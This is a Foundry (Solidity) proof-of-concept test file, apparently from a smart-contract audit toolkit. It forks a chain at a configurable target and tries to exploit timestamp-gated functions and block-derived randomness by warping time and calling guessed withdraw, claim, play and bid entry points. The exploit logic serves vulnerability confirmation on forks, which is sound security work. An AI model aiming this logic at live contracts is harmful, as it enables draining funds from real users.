// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Chain randomness + timestamp dependence
/// @notice Detectors: weak-randomness, timestamp, bytecode-timestamp.
///         The target draws "randomness" from block data (blockhash,
///         block.timestamp, block.prevrandao) or branches on
///         block.timestamp. Both are attacker-influenced: a miner/validator
///         shifts them, and anyone can predict them before playing.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. The gated / gameplay entry points are
///      guesses, so several are tried and the result is judged on the
///      OBSERVABLE -- the attacker's value actually moves -- never on the
///      bare fact that a call returned.

interface IGame {
    function play() external payable;
    function lastWinner() external view returns (address);
    function unlockTime() external view returns (uint256);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// Fingerprint of the caller's value plus the target's own win state.
    function _stateFingerprint(address who) internal view returns (uint256) {
        uint256 acc = who.balance;
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        if (ok && ret.length == 32) acc = uint256(keccak256(abi.encode(acc, abi.decode(ret, (uint256)))));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("lastWinner()"));
        if (ok && ret.length == 32) acc = uint256(keccak256(abi.encode(acc, abi.decode(ret, (address)))));
        return acc;
    }

    /// Try one time-gated entry point and accept it only when the OBSERVABLE
    /// changes, never when the call merely returns: the caller's value/state
    /// must move after the warp. A no-op returns successfully and moves
    /// nothing.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && _stateFingerprint(attacker) != before) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        used = _attempt(attacker, before, "withdraw()", abi.encodeWithSignature("withdraw()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "claim()", abi.encodeWithSignature("claim()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "unlock()", abi.encodeWithSignature("unlock()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "release()", abi.encodeWithSignature("release()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "execute()", abi.encodeWithSignature("execute()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "redeem()", abi.encodeWithSignature("redeem()"));
        if (bytes(used).length > 0) return used;
        return "";
    }

    /// Try one gameplay entry point and accept it only when the OBSERVABLE
    /// changes, never when the call merely returns: the attacker's balance
    /// must grow (they won the pot). A losing or no-op call returns
    /// successfully and moves nothing up.
    function _attemptRandom(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && attacker.balance > before) return label;
        return "";
    }

    /// The gameplay entry point is a GUESS; try the plausible ones with the
    /// value predicted from common block-derived formulas.
    function _tryEntryRandom(address attacker, uint256 before) internal returns (string memory used) {
        uint8 guessTs = uint8(block.timestamp % 256);
        uint256 predicted = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao)));
        uint256 predicted2 = uint256(keccak256(abi.encodePacked(block.number, block.prevrandao)));

        used = _attemptRandom(attacker, before, "guess(uint8)", abi.encodeWithSignature("guess(uint8)", guessTs));
        if (bytes(used).length > 0) return used;
        used = _attemptRandom(attacker, before, "play(uint256)", abi.encodeWithSignature("play(uint256)", predicted));
        if (bytes(used).length > 0) return used;
        used = _attemptRandom(attacker, before, "bid(uint256)", abi.encodeWithSignature("bid(uint256)", predicted2));
        if (bytes(used).length > 0) return used;
        used = _attemptRandom(attacker, before, "play()", abi.encodeWithSignature("play()"));
        if (bytes(used).length > 0) return used;
        used = _attemptRandom(attacker, before, "spin()", abi.encodeWithSignature("spin()"));
        if (bytes(used).length > 0) return used;
        used = _attemptRandom(attacker, before, "claim()", abi.encodeWithSignature("claim()"));
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_timestampGateBypassedByWarp() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        uint256 unlock = IGame(target).unlockTime();
        require(unlock > block.timestamp, "already unlocked at this fork block");
        uint256 before = _stateFingerprint(attackerEOA);
        vm.warp(unlock + 1);

        string memory used = _tryEntry(attackerEOA, before);
        console.log("time-gated entry point that opened after warp:", used);

        assertTrue(
            bytes(used).length > 0,
            "no time-gated entry point opened after warp. Tried withdraw(), claim(), unlock(), release(), execute(), redeem(). This does NOT establish safety: the gated function may have another name, be callable only by a specific caller, or gate on block.number rather than block.timestamp."
        );
    }

    function test_randomnessPredicted() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // Play at the block/timestamp where the formula favors the caller.
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);

        uint256 before = attackerEOA.balance;
        string memory used = _tryEntryRandom(attackerEOA, before);
        console.log("randomness entry point the attacker won through:", used);

        assertTrue(
            bytes(used).length > 0,
            "no randomness entry point reproduced. Tried guess(uint8), play(uint256), bid(uint256), play(), spin(), claim() with values predicted from block.timestamp / prevrandao / blockhash. This does NOT establish safety: the game may have another name or argument shape, draw from a source this harness did not predict, or require a specific msg.value bet."
        );
    }
}
